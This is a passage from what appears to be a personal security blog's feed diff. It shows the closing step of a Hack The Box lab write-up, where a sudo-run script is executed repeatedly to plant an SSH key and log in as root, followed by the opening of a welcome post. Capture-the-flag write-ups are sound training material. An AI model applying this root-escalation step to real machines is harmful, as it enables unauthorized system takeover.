+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/bin/enableSSH.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After executing the above a few times to make sure that the SSH key has made it in, we can then SSH in as root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb medium" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">New Blog Who Dis</title><link href="/blog/new-blog-who-dis/" rel="alternate" type="text/html" title="New Blog Who Dis" /><published>2021-06-07T15:15:00-07:00</published><updated>2021-06-07T15:15:00-07:00</updated><id>/blog/new-blog-who-dis</id><content type="html" xml:base="/blog/new-blog-who-dis/">&lt;p&gt;I’d like to welcome you to my blog!!&lt;/p&gt;
 
 &lt;p&gt;This blog is going to serve as my online researce for sharing InfoSec related topics, cooking, tech tips, and various other related material!&lt;/p&gt;
 
